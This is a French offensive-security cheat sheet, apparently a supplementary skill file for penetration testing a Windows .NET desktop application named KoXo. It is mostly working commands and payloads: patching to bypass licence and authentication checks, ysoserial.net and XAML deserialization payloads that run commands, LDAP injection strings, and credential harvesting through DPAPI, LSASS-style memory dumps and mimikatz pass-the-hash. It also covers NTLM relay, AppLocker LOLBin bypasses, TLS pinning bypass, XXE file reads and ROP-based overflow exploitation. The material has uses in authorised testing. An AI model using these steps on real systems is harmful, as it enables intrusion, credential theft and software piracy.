# Techniques Avancées — Complément au SKILL.md

## 1. Reverse Engineering .NET (dnSpy)

Outils: dnSpy (patching + debug), ILSpy (scan rapide), dotPeek (export VS)

### Recherche de secrets dans le code décompilé
- Chercher: "password", "ldap", "LDAP://", "ConnectionString", "DPAPI", "AES", "secret"
- Hardcoded: string password = "Admin123!";
- LDAP: new DirectoryEntry($"LDAP://{server}", user, pass);
- Auth logic: if (user == "admin" && hash == expectedHash)
- Crypto keys: aes.Key = Convert.FromBase64String("...");

### Patching (bypass licence/auth)
- dnSpy: Edit Method → modifier → Save Module
- CheckLicense() { return true; }
- if (!currentUser.IsAdmin) → if (true)

### Obfuscation
- de4dot: de4dot app.exe -o cleaned.dll (ConfuserEx, Dotfuscator)
- Runtime: breakpoint sur méthode de décryption → lire valeurs

### Extraction ressources
- PowerShell: [Assembly]::LoadFile("app.exe").GetManifestResourceNames()

## 2. Désérialisation .NET

### Détection
- BinaryFormatter.Deserialize → TRÈS vulnérable
- JsonConvert.DeserializeObject → si TypeNameHandling = All/Auto
- XamlReader.Load → RCE direct

### Exploitation (ysoserial.net)
  ysoserial.exe -g ClaimsPrincipal -f BinaryFormatter -o base64 -c "powershell -enc ..."
  ysoserial.exe -g ObjectDataProvider -f Json.Net -o raw -s "calc.exe"

### XAML injection
  <ObjectDataProvider ObjectType="{x:Type sys:Process}" MethodName="Start">
    <ObjectDataProvider.MethodParameters>
      <sys:String>cmd</sys:String><sys:String>/c calc.exe</sys:String>
    </ObjectDataProvider.MethodParameters>
  </ObjectDataProvider>

## 3. Attaques spécifiques Active Directory

### LDAP injection
  *)(&(uid=*))               # Retourne tout
  *)(uid=*))(|(uid=*         # Boolean blind
  *(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2)

### AD credential harvesting
- Config: App.config, Web.config (connectionStrings)
- Registry: reg query "HKCU\Software\KoXo" /s
- DPAPI: [ProtectedData]::Unprotect($blob, $null, [DataProtectionScope]::CurrentUser)
- Credential Manager: cmdkey /list → runas /savecred
- Process memory: procdump -ma KoXo.exe → strings | grep pass

### Pass-the-hash
  mimikatz # sekurlsa::pth /user:admin /domain:DOMAIN /ntlm:<hash> /run:"cmd.exe"

### BloodHound
  SharpHound.exe -c All -d domain.local -u user -p pass --zipfilename out.zip

## 4. Windows Hardening Checks

### Defender
  Get-MpComputerStatus
  Get-MpPreference | Select ExclusionPath, ExclusionProcess
  Get-MpPreference | Select AttackSurfaceReductionRules_Ids

### AppLocker/WDAC
  Get-AppLockerPolicy -Effective -Xml
  # Bypass: installutil.exe, rundll32, regsvr32 (LOLBins)

### Process Mitigations
  Get-ProcessMitigation -Name KoXo.exe
  # DEP ON → ROP pour bypass
  # ASLR ON → info leak nécessaire
  # CFG ON → gadgets non-CFG
  # SEHOP ON → SEH valide requis

### LAPS
  Get-ADComputer $env:COMPUTERNAME -Properties ms-Mcs-AdmPwd

## 5. Analyse statique PE

### Strings + FLOSS
  strings -n 8 app.exe > strings.txt
  floss.exe app.exe > floss.txt  # strings obfusquées (xor/base64/stack)

### PE headers (pefile)
  import pefile; pe = pefile.PE("app.exe")
  for entry in pe.DIRECTORY_ENTRY_IMPORT: print(entry.dll, [i.name for i in entry.imports])
  for s in pe.sections: print(f"{s.Name}: entropy={s.get_entropy():.2f}")  # >7.0 = compressé

### API intéressantes
- wldap32.dll (ldap_bind, ldap_search) → app LDAP directe
- advapi32.dll (RegOpenKey, CreateService) → registre, services
- dbghelp.dll (MiniDumpWriteDump) → peut dumper LSASS

### Manifest (UAC level)
  sigcheck.exe -m app.exe  # asInvoker | requireAdministrator | highestAvailable

### Désassemblage (Capstone)
  from capstone import Cs, CS_ARCH_X86, CS_MODE_64
  md = Cs(CS_ARCH_X86, CS_MODE_64)
  for i in md.disasm(code, base+entry): print(f"0x{i.address:x}: {i.mnemonic} {i.op_str}")

## 6. Analyse réseau

### Wireshark filtres
  ldap                    # trafic LDAP
  ldap.simpleBindRequest   # creds en clair
  ldap.filter              # filtres LDAP construits par l'app
  ntlmssp                  # auth NTLM
  tcp.port==389 and not tcp.port==636  # LDAP en clair

### tshark
  tshark -i Ethernet -f "port 389" -w ldap.pcap
  tshark -r ldap.pcap -Y "ldap.simpleBindRequest" -T fields -e ldap.boundName -e ldap.authentication

### NTLM relay
  python3 ntlmrelayx.py -t ldap://dc01 --delegate-access

### Proxy pour app desktop
  set HTTP_PROXY=http://127.0.0.1:8888
  netsh winhttp set proxy 127.0.0.1:8888
  # .NET: app.exe.config (system.net > defaultProxy) ou patcher via dnSpy
  # TCP tunnel LDAP: socat TCP-LISTEN:389,fork TCP:DC_IP:389

### Pinning bypass
  dnSpy: patcher ServerCertificateValidationCallback → return true
  Frida: hook SSL_get_verify_result → forcer retour 0

## 7. Fuzzing

### WinAFL
  afl-fuzz.exe -i corpus -o findings -D C:\DynamoRIO\bin32 -- \
    --target_module app.exe --target_method ParseImport

### Payloads champs de saisie
- Long strings (A*10000), format strings (%n%s), caractères spéciaux (<>\"'\\;/&|)
- Null bytes, Unicode (\\x00 \\xfe \\xff)
- Observer: crashes, access violations (WinDbg attaché)

### Fuzzing fichiers d'import
  radamsa -n 100 -o fuzz_%n.txt   # mutation-based
  # XXE: <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
  # Billion laughs: entités imbriquées → DoS

### Capture crashs
  reg add "HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\LocalDumps\app.exe" /v DumpFolder /d "C:\CrashDumps" /f
  reg add "...\\LocalDumps\\app.exe" /v DumpType /d 2 /f  # full dump

## 8. Analyse de crashs (WinDbg + mona.py)

### WinDbg
  !analyze -v    # exception, faulting IP, stack trace
  r             # registers (EIP = 41414141? → contrôle flux)
  kb            # stack trace
  !heap -s      # heap corruption

### mona.py
  !mona pattern 10000             # pattern cyclique
  !mona pattern_offset 41414141   # offset exact
  !mona noaslr                   # modules non-ASLR
  !mona nosafeseh                 # modules sans SafeSEH
  !mona jmp -r esp -m "module"   # JMP/CALL ESP
  !mona rop -m "module" -cp nonull  # gadgets ROP

### Stratégie par mitigations
- Pas DEP → shellcode direct sur stack
- DEP sans ASLR → ROP (gadgets fixes) → VirtualProtect
- DEP + ASLR → info leak + ROP
- SEH bypass: pop pop ret + jump court nSEH
